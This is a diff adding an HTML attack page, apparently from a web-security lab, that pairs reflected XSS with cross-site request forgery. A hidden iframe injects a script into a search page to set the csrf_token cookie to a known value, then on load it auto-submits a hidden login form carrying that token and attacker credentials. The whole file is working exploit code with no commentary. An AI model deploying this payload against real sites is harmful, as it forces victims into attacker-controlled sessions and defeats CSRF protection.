@@ -1,0 +1,15 @@
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.11.3/jquery.min.js"></script>
+<iframe id="hahaframe" name="haha" width="800" height="800" onload=payload() src="http://permalink.co:8080/search?xssdefense=0&q=<script>{document.cookie='csrf_token=0123456789ABCDEF'}</script>" hidden></iframe>
+
+<form id='test' method='post' action='http://permalink.co:8080/login?csrfdefense=1&xssdefense=0' target='haha' hidden>
+<input name='csrf_token' value='0123456789ABCDEF'/>
+<input name='username' value='attacker'/>
+<input name='password' value='l33th4x'/>
+</form>
+
+<script>
+function payload(){
+    document.getElementById('test').submit();
+}
+
+</script>
